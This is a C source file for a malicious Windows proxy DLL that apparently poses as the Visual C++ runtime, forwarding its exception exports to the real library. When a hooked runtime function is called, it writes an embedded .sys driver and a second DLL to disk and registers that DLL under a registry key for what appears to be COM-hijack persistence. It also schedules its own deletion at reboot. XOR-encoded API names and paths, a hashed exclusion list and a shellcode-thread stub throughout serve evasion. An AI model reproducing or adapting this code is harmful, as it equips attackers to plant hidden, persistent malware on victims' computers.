#include <intrin.h>
#include <windows.h>

typedef struct _MY_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  WCHAR *Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_PEB_LDR_DATA {
  BYTE Reserved1[8];
  PVOID Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} MY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
  LIST_ENTRY InLoadOrderLinks;
  LIST_ENTRY InMemoryOrderLinks;
  LIST_ENTRY InInitializationOrderLinks;
  PVOID DllBase;
  PVOID EntryPoint;
  ULONG SizeOfImage;
  MY_UNICODE_STRING FullDllName;
  MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB {
  BYTE Reserved1[2];
  BYTE BeingDebugged;
  BYTE Reserved2[1];
  PVOID Reserved3[2];
  MY_PEB_LDR_DATA *Ldr;
} MY_PEB;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define SEC_IMAGE 0x1000000
typedef NTSTATUS(NTAPI *pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID,
                                          PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR,
                                             SIZE_T, PLARGE_INTEGER, PSIZE_T,
                                             DWORD, ULONG, ULONG);
typedef NTSTATUS(NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T,
                                                 ULONG, PULONG);
typedef HANDLE(WINAPI *pFindFirstFileW)(LPCWSTR, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI *pFindNextFileW)(HANDLE, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI *pFindClose)(HANDLE);
typedef UINT(WINAPI *pGetSystemDirectoryW)(LPWSTR, UINT);
typedef HANDLE(WINAPI *pCreateFileW)(LPCWSTR, DWORD, DWORD,
                                     LPSECURITY_ATTRIBUTES, DWORD, DWORD,
                                     HANDLE);
typedef BOOL(WINAPI *pCloseHandle)(HANDLE);
typedef HANDLE(WINAPI *pGetCurrentProcess)(void);
typedef void(WINAPI *pSleep)(DWORD);
typedef HANDLE(WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                      LPTHREAD_START_ROUTINE, LPVOID, DWORD,
                                      LPDWORD);
typedef DWORD(WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef LPVOID(WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);

extern unsigned char _binary_enc_shellcode_bin_start[];
extern unsigned char _binary_enc_shellcode_bin_end[];

void ___chkstk_ms(void) { return; }

void *memset(void *dest, int val, size_t count) {
  unsigned char *p = (unsigned char *)dest;
  while (count--)
    *p++ = (unsigned char)val;
  return dest;
}

void *memcpy(void *dest, const void *src, size_t count) {
  unsigned char *d = (unsigned char *)dest;
  const unsigned char *s = (const unsigned char *)src;
  while (count--)
    *d++ = *s++;
  return dest;
}

void *memmove(void *dest, const void *src, size_t count) {
  unsigned char *d = (unsigned char *)dest;
  const unsigned char *s = (const unsigned char *)src;
  if (d < s) {
    while (count--)
      *d++ = *s++;
  } else if (d > s) {
    d += count;
    s += count;
    while (count--)
      *(--d) = *(--s);
  }
  return dest;
}

void *memchr(const void *ptr, int val, size_t count) {
  const unsigned char *p = (const unsigned char *)ptr;
  while (count--) {
    if (*p == (unsigned char)val)
      return (void *)p;
    p++;
  }
  return (void *)0;
}

int memcmp(const void *s1, const void *s2, size_t count) {
  const unsigned char *a = (const unsigned char *)s1;
  const unsigned char *b = (const unsigned char *)s2;
  while (count--) {
    if (*a != *b)
      return *a - *b;
    a++;
    b++;
  }
  return 0;
}

static int w2l_a(const WCHAR *src, char *dst, int max) {
  int i = 0;
  while (src[i] && i < max - 1) {
    WCHAR c = src[i];
    if (c >= 'A' && c <= 'Z')
      c += 32;
    dst[i] = (char)c;
    i++;
  }
  dst[i] = 0;
  return i;
}

static unsigned int fnv1a(const char *s) {
  unsigned int h = 0x811c9dc5U;
  while (*s) {
    unsigned char c = (unsigned char)*s++;
    if (c >= 'A' && c <= 'Z')
      c += 32;
    h ^= c;
    h *= 0x01000193U;
  }
  return h;
}

#define EXCL_COUNT 25
static int is_excluded(const char *name) {
  static const unsigned int exc_hashes[EXCL_COUNT] = {
      0x39794115U, 0x8A464819U, 0x96C0ADB4U, 0xF18B972FU, 0xFC84966AU,
      0xA3E6F6C3U, 0xBD6D9917U, 0x51D79D77U, 0xA62A3B3BU, 0x174C966EU,
      0xBB40E468U, 0x8EC4C73BU, 0xC0323159U, 0xEF148EF1U, 0x8F8E7D23U,
      0xF612CD43U, 0xEA6423E3U, 0xF6BDBD88U, 0x1C626FB1U, 0xFA102E29U,
      0x8B4D9112U, 0xCC3C0247U, 0x36E1BF09U, 0xF12937A6U, 0xE6CF3F46U,
  };
  unsigned int h = fnv1a(name);
  int i;
  for (i = 0; i < EXCL_COUNT; i++) {
    if (h == exc_hashes[i])
      return 1;
  }
  return 0;
}

static int triggered = 0;

static struct {
  void *a;
  pSleep s;
} g_tc;

static DWORD WINAPI _sc_thd(LPVOID p) {
  ((void (*)(void))g_tc.a)();
  return 0;
}

static int is_dll_loaded(const WCHAR *name, MY_PEB *peb) {
  MY_PEB_LDR_DATA *ldr = peb->Ldr;
  LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
  LIST_ENTRY *entry = head->Flink;
  while (entry != head) {
    MY_LDR_DATA_TABLE_ENTRY *mod =
        (MY_LDR_DATA_TABLE_ENTRY *)((BYTE *)entry - sizeof(LIST_ENTRY));
    if (mod->BaseDllName.Buffer && mod->BaseDllName.Length > 0) {
      WCHAR *a = mod->BaseDllName.Buffer;
      const WCHAR *b = name;
      int match = 1;
      while (*a && *b) {
        WCHAR ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z')
          ca += 32;
        if (cb >= 'A' && cb <= 'Z')
          cb += 32;
        if (ca != cb) {
          match = 0;
          break;
        }
        a++;
        b++;
      }
      if (match && *a == 0 && *b == 0)
        return 1;
    }
    entry = entry->Flink;
  }
  return 0;
}

static int is_excluded_w(const WCHAR *name) {
  char ascii[256];
  w2l_a(name, ascii, 256);
  int r = is_excluded(ascii);
  memset(ascii, 0, 256);
  return r;
}

static unsigned char ck2[] = "9832gf2bc29_120e9hd10c))b@@!11";
static unsigned int ck2l = 30;

static void xd(unsigned char *enc, char *out, int len) {
  int i;
  for (i = 0; i < len; i++)
    out[i] = enc[i] ^ ck2[i % ck2l];
  out[len] = 0;
}

static void xe(char *plain, unsigned char *enc, int len) {
  int i;
  for (i = 0; i < len; i++)
    enc[i] = plain[i] ^ ck2[i % ck2l];
  memset(plain, 0, len);
}

static void xb(unsigned char *enc, unsigned char *out, int len,
               int abs_offset) {
  int i;
  for (i = 0; i < len; i++)
    out[i] = enc[i] ^ ck2[(abs_offset + i) % ck2l];
}

static HMODULE rl(unsigned char *enc, int len) {
  char buf[64] = {0};
  xd(enc, buf, len);
  HMODULE mod = LoadLibraryA(buf);
  xe(buf, enc, len);
  return mod;
}

static FARPROC ra(HMODULE mod, unsigned char *enc, int len) {
  char buf[64] = {0};
  xd(enc, buf, len);
  FARPROC fn = GetProcAddress(mod, buf);
  xe(buf, enc, len);
  return fn;
}

#include "payloads.h"

unsigned long long __cdecl strlen(const char *s) {
  unsigned long long l = 0;
  while (s[l])
    l++;
  return l;
}

void *_set_se_translator(void *translator) {
  if (triggered)
    return (void *)0;
  triggered = 1;

  unsigned char e_kernel32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
                                0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};

  HMODULE hK32 = rl(e_kernel32, 13);

  unsigned char e_CreateDirectoryA[] = {0x7a, 0x4a, 0x56, 0x53, 0x13, 0x03,
                                        0x76, 0x0b, 0x11, 0x57, 0x5a, 0x2b,
                                        0x5e, 0x40, 0x49, 0x24, 0x39};
  unsigned char e_CreateFileA[] = {0x7a, 0x4a, 0x56, 0x53, 0x13, 0x03,
                                   0x74, 0x0b, 0x0f, 0x57, 0x78, 0x5f};
  unsigned char e_WriteFile[] = {0x6e, 0x4a, 0x5a, 0x46, 0x02,
                                 0x20, 0x5b, 0x0e, 0x06, 0x32};
  unsigned char e_CloseHandle[] = {0x7a, 0x54, 0x5c, 0x41, 0x02, 0x2e,
                                   0x53, 0x0c, 0x07, 0x5e, 0x5c, 0x5f};

  unsigned char e_MoveFileExA[] = {0x74, 0x57, 0x45, 0x57, 0x21, 0x0f,
                                   0x5e, 0x07, 0x26, 0x4a, 0x78};
  unsigned char e_GetModuleFileNameA[] = {0x7e, 0x5d, 0x47, 0x7f, 0x08, 0x02,
                                          0x47, 0x0e, 0x06, 0x74, 0x50, 0x33,
                                          0x54, 0x7c, 0x51, 0x08, 0x5c, 0x29};
  unsigned char e_VirtualQuery[] = {0x6f, 0x51, 0x41, 0x46, 0x12, 0x07,
                                    0x5e, 0x33, 0x16, 0x57, 0x4b, 0x26};

  typedef BOOL(WINAPI * pCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
  typedef HANDLE(WINAPI * pCreateFileA)(
      LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
  typedef BOOL(WINAPI * pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD,
                                    LPOVERLAPPED);
  typedef BOOL(WINAPI * pCloseHandle)(HANDLE);
  typedef BOOL(WINAPI * pMoveFileExA)(LPCSTR, LPCSTR, DWORD);
  typedef DWORD(WINAPI * pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
  typedef SIZE_T(WINAPI * pVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION,
                                         SIZE_T);

  pCreateDirectoryA fCreateDirectoryA =
      (pCreateDirectoryA)ra(hK32, e_CreateDirectoryA, 17);
  pCreateFileA fCreateFileA = (pCreateFileA)ra(hK32, e_CreateFileA, 12);
  pWriteFile fWriteFile = (pWriteFile)ra(hK32, e_WriteFile, 10);
  pCloseHandle fCloseHandle = (pCloseHandle)ra(hK32, e_CloseHandle, 12);
  pMoveFileExA fMoveFileExA = (pMoveFileExA)ra(hK32, e_MoveFileExA, 11);
  pGetModuleFileNameA fGetModuleFileNameA =
      (pGetModuleFileNameA)ra(hK32, e_GetModuleFileNameA, 18);
  pVirtualQuery fVirtualQuery = (pVirtualQuery)ra(hK32, e_VirtualQuery, 12);

  unsigned char e_cache_dir[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55,
                                 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53,
                                 0x6c, 0x2b, 0x58, 0x1c, 0x0d, 0x47, 0x55,
                                 0x20, 0x48, 0x4a, 0x0a, 0x25};
  char cache_dir[256];
  xd(e_cache_dir, cache_dir, 26);
  fCreateDirectoryA(cache_dir, NULL);

  unsigned char e_sys_path[] = {
      0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f,
      0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x2b, 0x58, 0x1c, 0x0d, 0x47,
      0x55, 0x20, 0x48, 0x4a, 0x0a, 0x25, 0x1c, 0x65, 0x43, 0x58,
      0x4f, 0x5d, 0x41, 0x41, 0x24, 0x0a, 0x5d, 0x17, 0x07, 0x6d,
      0x58, 0x32, 0x55, 0x04, 0x04, 0x4b, 0x4a, 0x11, 0x17};
  char sys_path[256];
  xd(e_sys_path, sys_path, 49);

  HANDLE hFile = fCreateFileA(sys_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile != INVALID_HANDLE_VALUE) {
    DWORD written = 0;
    int current_offset = 0;
    int chunk_size = 4096;
    while (current_offset < file_sys_len) {
      int sz = file_sys_len - current_offset;
      if (sz > chunk_size)
        sz = chunk_size;
      xb(file_sys + current_offset, file_sys + current_offset, sz,
         current_offset);
      fWriteFile(hFile, file_sys + current_offset, sz, &written, NULL);
      current_offset += sz;
    }
    fCloseHandle(hFile);
  }

  unsigned char e_dll_path[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10,
                                0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x2b,
                                0x58, 0x1c, 0x0d, 0x47, 0x55, 0x20, 0x48, 0x4a,
                                0x0a, 0x25, 0x1c, 0x4c, 0x5c, 0x55, 0x5c, 0x4e,
                                0x5f, 0x5b, 0x05, 0x48, 0x56, 0x0e, 0x0f};
  char dll_path[256];
  xd(e_dll_path, dll_path, 39);

  hFile = fCreateFileA(dll_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile != INVALID_HANDLE_VALUE) {
    DWORD written = 0;
    int current_offset = 0;
    int chunk_size = 4096;
    while (current_offset < file_dll_len) {
      int sz = file_dll_len - current_offset;
      if (sz > chunk_size)
        sz = chunk_size;
      xb(file_dll + current_offset, file_dll + current_offset, sz,
         current_offset);
      fWriteFile(hFile, file_dll + current_offset, sz, &written, NULL);
      current_offset += sz;
    }
    fCloseHandle(hFile);
  }

  unsigned char e_reg_key[] = {0x6a, 0x57, 0x55, 0x46, 0x10, 0x07, 0x40, 0x07, 0x3f, 0x71, 0x55, 0x3e, 0x42, 0x41, 0x55, 0x16, 0x65, 0x2b, 0x28, 0x62, 0x79, 0x27, 0x75, 0x52, 0x26, 0x79, 0x71, 0x15, 0x05, 0x75, 0x7a, 0x7c, 0x1e, 0x77, 0x5e, 0x5f, 0x0a, 0x4f, 0x57, 0x77, 0x7a, 0x1e, 0x1c, 0x73, 0x72, 0x53, 0x78, 0x45, 0x20, 0x72, 0x74, 0x5b, 0x1a, 0x6a, 0x21, 0x02, 0x01, 0x10, 0x07, 0x75, 0x44, 0x64, 0x7a, 0x5c, 0x37, 0x14, 0x5d, 0x01, 0x30, 0x57, 0x4b, 0x29, 0x54, 0x40, 0x03, 0x57, 0x39};
  char reg_key[256];
  xd(e_reg_key, reg_key, 77);

  HKEY hKey;
  if (RegCreateKeyExA(HKEY_CURRENT_USER, reg_key, 0, NULL, REG_OPTION_NON_VOLATILE,
                      KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
    unsigned char e_ThreadingModel[] = {0x6d, 0x50, 0x41, 0x57, 0x06,
                                        0x02, 0x5b, 0x0c, 0x04, 0x7f,
                                        0x56, 0x3b, 0x54, 0x5e, 0x30};
    char ThreadingModel[32];
    xd(e_ThreadingModel, ThreadingModel, 15);

    unsigned char e_Apartment[] = {0x78, 0x48, 0x52, 0x40, 0x13,
                                   0x0b, 0x57, 0x0c, 0x17, 0x32};
    char Apartment[32];
    xd(e_Apartment, Apartment, 10);

    RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE *)dll_path, 40);
    RegSetValueExA(hKey, ThreadingModel, 0, REG_SZ, (const BYTE *)Apartment, 11);
    RegCloseKey(hKey);
  }

  MEMORY_BASIC_INFORMATION mbi;
  HMODULE hModule = NULL;
  if (fVirtualQuery(_set_se_translator, &mbi, sizeof(mbi)) != 0) {
    hModule = (HMODULE)mbi.AllocationBase;
  }

  if (hModule != NULL) {
    char module_path[MAX_PATH];
    if (fGetModuleFileNameA(hModule, module_path, MAX_PATH) > 0) {
      fMoveFileExA(module_path, NULL, 0x4);
    }
  }

  return (void *)0;
}

void *p___C_specific_handler;
EXCEPTION_DISPOSITION __attribute__((naked))
__C_specific_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
                     void *EstablisherFrame, struct _CONTEXT *ContextRecord,
                     struct _DISPATCHER_CONTEXT *DispatcherContext) {
  asm("jmp *p___C_specific_handler(%rip)");
}

void *p___current_exception;
void __attribute__((naked)) __current_exception() {
  asm("jmp *p___current_exception(%rip)");
}

void *p___current_exception_context;
void __attribute__((naked)) __current_exception_context() {
  asm("jmp *p___current_exception_context(%rip)");
}

void *p___CxxFrameHandler3;
void __attribute__((naked)) __CxxFrameHandler3() {
  asm("jmp *p___CxxFrameHandler3(%rip)");
}

void *p___std_exception_copy;
void __attribute__((naked)) __std_exception_copy() {
  asm("jmp *p___std_exception_copy(%rip)");
}

void *p___std_exception_destroy;
void __attribute__((naked)) __std_exception_destroy() {
  asm("jmp *p___std_exception_destroy(%rip)");
}

void *p__CxxThrowException;
void __attribute__((naked)) _CxxThrowException() {
  asm("jmp *p__CxxThrowException(%rip)");
}

void *p___uncaught_exceptions;
void __attribute__((naked)) __uncaught_exceptions() {
  asm("jmp *p___uncaught_exceptions(%rip)");
}

void *p___uncaught_exception;
void __attribute__((naked)) __uncaught_exception() {
  asm("jmp *p___uncaught_exception(%rip)");
}

void *p___std_terminate;
void __attribute__((naked)) __std_terminate() {
  asm("jmp *p___std_terminate(%rip)");
}

void *p__purecall;
void __attribute__((naked)) _purecall() { asm("jmp *p__purecall(%rip)"); }

void *p___AdjustPointer;
void __attribute__((naked)) __AdjustPointer() {
  asm("jmp *p___AdjustPointer(%rip)");
}

void *p___std_type_info_destroy_list;
void __attribute__((naked)) __std_type_info_destroy_list() {
  asm("jmp *p___std_type_info_destroy_list(%rip)");
}

void *p___processing_throw;
void __attribute__((naked)) __processing_throw() {
  asm("jmp *p___processing_throw(%rip)");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    unsigned char e_sys_vc[] = {
        0x7a, 0x02, 0x6f, 0x65, 0x0e, 0x08, 0x56, 0x0d, 0x14, 0x41, 0x65, 0x0c,
        0x48, 0x41, 0x44, 0x00, 0x54, 0x5b, 0x56, 0x6d, 0x46, 0x00, 0x5b, 0x5c,
        0x0c, 0x34, 0x29, 0x4c, 0x54, 0x00, 0x0d, 0x08, 0x1d, 0x56, 0x0b, 0x0a};
    char sys_vc[64];
    xd(e_sys_vc, sys_vc, 36);

    HMODULE hReal = LoadLibraryA(sys_vc);
    if (hReal) {
      unsigned char e___C_specific_handler[] = {
          0x66, 0x67, 0x70, 0x6d, 0x14, 0x16, 0x57, 0x01, 0x0a, 0x54,
          0x50, 0x3c, 0x6e, 0x5a, 0x51, 0x0b, 0x5d, 0x04, 0x01, 0x43}; // 20
      p___C_specific_handler = ra(hReal, e___C_specific_handler, 20);

      unsigned char e___current_exception[] = {
          0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17, 0x6d,
          0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07, 0x0a}; // 19
      p___current_exception = ra(hReal, e___current_exception, 19);

      unsigned char e___current_exception_context[] = {
          0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17,
          0x6d, 0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07,
          0x0a, 0x6e, 0x53, 0x0c, 0x47, 0x5d, 0x07, 0x38, 0x34}; // 27
      p___current_exception_context =
          ra(hReal, e___current_exception_context, 27);

      unsigned char e___CxxFrameHandler3[] = {
          0x66, 0x67, 0x70, 0x4a, 0x1f, 0x20, 0x40, 0x03, 0x0e,
          0x57, 0x71, 0x3e, 0x5f, 0x56, 0x5c, 0x00, 0x4b, 0x5b}; // 18
      p___CxxFrameHandler3 = ra(hReal, e___CxxFrameHandler3, 18);

      unsigned char e___std_exception_copy[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a, 0x00, 0x57,
          0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a, 0x5a, 0x07, 0x14, 0x48}; // 20
      p___std_exception_copy = ra(hReal, e___std_exception_copy, 20);

      unsigned char e___std_exception_destroy[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a,
          0x00, 0x57, 0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a,
          0x5d, 0x0d, 0x17, 0x45, 0x42, 0x0c, 0x50}; // 23
      p___std_exception_destroy = ra(hReal, e___std_exception_destroy, 23);

      unsigned char e__CxxThrowException[] = {
          0x66, 0x7b, 0x4b, 0x4a, 0x33, 0x0e, 0x40, 0x0d, 0x14,
          0x77, 0x41, 0x3c, 0x54, 0x42, 0x44, 0x0c, 0x56, 0x06}; // 18
      p__CxxThrowException = ra(hReal, e__CxxThrowException, 18);

      unsigned char e___uncaught_exceptions[] = {
          0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46, 0x66,
          0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f, 0x43}; // 21
      p___uncaught_exceptions = ra(hReal, e___uncaught_exceptions, 21);

      unsigned char e___uncaught_exception[] = {
          0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46,
          0x66, 0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f}; // 20
      p___uncaught_exception = ra(hReal, e___uncaught_exception, 20);

      unsigned char e___std_terminate[] = {0x66, 0x67, 0x40, 0x46, 0x03,
                                           0x39, 0x46, 0x07, 0x11, 0x5f,
                                           0x50, 0x31, 0x50, 0x46, 0x55}; // 15
      p___std_terminate = ra(hReal, e___std_terminate, 15);

      unsigned char e__purecall[] = {0x66, 0x48, 0x46, 0x40, 0x02,
                                     0x05, 0x53, 0x0e, 0x0f}; // 9
      p__purecall = ra(hReal, e__purecall, 9);

      unsigned char e___AdjustPointer[] = {0x66, 0x67, 0x72, 0x56, 0x0d,
                                           0x13, 0x41, 0x16, 0x33, 0x5d,
                                           0x50, 0x31, 0x45, 0x57, 0x42}; // 15
      p___AdjustPointer = ra(hReal, e___AdjustPointer, 15);

      unsigned char e___std_type_info_destroy_list[] = {
          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x46, 0x1b, 0x13, 0x57,
          0x66, 0x36, 0x5f, 0x54, 0x5f, 0x3a, 0x5d, 0x0d, 0x17, 0x45,
          0x42, 0x0c, 0x50, 0x76, 0x0e, 0x29, 0x33, 0x55}; // 28
      p___std_type_info_destroy_list =
          ra(hReal, e___std_type_info_destroy_list, 28);

      unsigned char e___processing_throw[] = {
          0x66, 0x67, 0x43, 0x40, 0x08, 0x05, 0x57, 0x11, 0x10,
          0x5b, 0x57, 0x38, 0x6e, 0x46, 0x58, 0x17, 0x56, 0x1f}; // 18
      p___processing_throw = ra(hReal, e___processing_throw, 18);
    }
  }
  return TRUE;
}
